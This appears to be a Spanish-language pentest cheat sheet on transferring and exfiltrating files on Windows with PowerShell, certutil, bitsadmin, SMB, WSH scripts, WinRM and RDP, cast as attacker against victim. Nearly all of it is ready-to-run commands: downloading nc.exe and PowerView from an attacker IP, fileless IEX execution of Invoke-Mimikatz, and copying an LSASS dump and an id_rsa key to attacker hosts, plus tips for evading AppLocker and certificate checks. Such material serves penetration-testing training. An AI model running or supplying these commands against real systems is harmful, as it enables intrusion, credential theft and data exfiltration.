---
title: "Transferencia de Archivos en Windows"
pubDate: '2026-08-26'
---
Guía técnica de utilidades nativas de Windows (PowerShell, Certutil, Bitsadmin, SMB, VBScript, WinRM y RDP) para transferencia y exfiltración de archivos.

---

## 📋 1. Codificación en Base64 (Sin Red)

### De Linux (Atacante) a Windows (Víctima):
```bash
# 1. ATACANTE (Linux): Codificar archivo a Base64
cat id_rsa | base64 -w 0; echo
```
```powershell
# 2. VÍCTIMA (PowerShell): Decodificar y escribir archivo en disco
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<CADENA_BASE64>"))

# 3. VÍCTIMA: Verificar integridad MD5
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

### De Windows (Víctima) a Linux (Atacante):
```powershell
# 1. VÍCTIMA (PowerShell): Codificar archivo de Windows y calcular MD5
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte))
Get-FileHash "C:\Windows\System32\drivers\etc\hosts" -Algorithm MD5 | Select-Object Hash
```
```bash
# 2. ATACANTE (Linux): Reconstruir y verificar MD5
echo "<CADENA_BASE64>" | base64 -d > hosts
md5sum hosts
```

---

## 🌐 2. Descargas HTTP/HTTPS con PowerShell y CMD

### Métodos de Descarga a Disco:
```powershell
# Método 1: Net.WebClient (Síncrono)
(New-Object Net.WebClient).DownloadFile('http://10.10.10.32/PowerView.ps1', 'C:\Users\Public\PowerView.ps1')

# Método 2: Net.WebClient (Asíncrono)
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.32/PowerView.ps1', 'C:\Users\Public\PowerViewAsync.ps1')

# Método 3: Invoke-WebRequest / iwr
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -OutFile PowerView.ps1
iwr http://10.10.10.32/PowerView.ps1 -OutFile PowerView.ps1
```

### Binarios Nativos de Windows (CMD):
```cmd
:: cURL nativo (Windows 10 Build 17063+)
curl.exe -o PowerView.ps1 http://10.10.10.32/PowerView.ps1

:: Certutil (Binario nativo para gestión de certificados)
certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe C:\Users\Public\nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe

:: Bitsadmin (Background Intelligent Transfer Service)
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Users\Public\nc.exe
```

### Ejecución Directa en Memoria (Fileless):
```powershell
# Ejecución en memoria con IEX
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.32/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('http://10.10.10.32/Invoke-Mimikatz.ps1') | IEX

# Bypass de motor Internet Explorer con Invoke-WebRequest
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -UseBasicParsing | IEX

# Ignorar errores de certificados SSL no confiables
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## 📁 3. Transferencias mediante SMB

### 1. ATACANTE: Levantar Servidor SMB con Impacket
```bash
# Modo Invitado (Sin credenciales)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Con credenciales (Obligatorio en versiones modernas de Windows 10/11 y Server)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### 2. VÍCTIMA: Copiar Archivos
```cmd
:: Copia directa sin credenciales
copy \\10.10.10.32\share\nc.exe C:\Users\Public\nc.exe

:: Si requiere credenciales: montar unidad de red y copiar
net use n: \\10.10.10.32\share /user:test test
copy C:\lsass.DMP \\10.10.15.71\share\
```

---

## 🪟 4. Scripts WSH Nativos (VBScript y JScript)

Utilidades ejecutadas con el motor integrado `cscript.exe` (útil si PowerShell está restringido o bloqueado por AppLocker/Constrained Language Mode):

### VBScript (`wget.vbs`)
```vbscript
' Guardar como wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
```cmd
cscript.exe /nologo wget.vbs http://10.10.10.32/nc.exe C:\Users\Public\nc.exe
```

### JScript (`wget.js`)
```javascript
// Guardar como wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
```cmd
cscript.exe /nologo wget.js http://10.10.10.32/nc.exe C:\Users\Public\nc.exe
```

---

## 🔄 5. PowerShell Remoting y RDP Drive Redirection

### Transferencia Bidireccional con WinRM (PowerShell Remoting)
```powershell
# 1. Comprobar puerto WinRM 5985
Test-NetConnection -ComputerName TARGET_PC -Port 5985

# 2. Crear sesión persistente
$Session = New-PSSession -ComputerName TARGET_PC -Credential (Get-Credential)

# 3. Enviar archivo local al objetivo
Copy-Item -Path C:\tools\nc.exe -ToSession $Session -Destination C:\Users\Public\nc.exe

# 4. Traer archivo desde el objetivo
Copy-Item -Path C:\SensitiveData.zip -Destination C:\ -FromSession $Session
```

### Mapeo de Unidad de Red en RDP (RDP Drive Redirection)
Permite que una carpeta local de Linux aparezca expuesta como una unidad de red dentro del escritorio remoto (`\\tsclient\`):
```bash
# Con xfreerdp
xfreerdp3 /v:<TARGET_IP> /u:Administrator /p:'Password123' /drive:kali,/home/eddy/tools /cert:ignore

# Con rdesktop
rdesktop <TARGET_IP> -u Administrator -p 'Password123' -r disk:linux=/home/eddy/tools
```
Dentro de la sesión de Windows: abrir explorador y navegar a `\\tsclient\kali` o `\\tsclient\linux`.
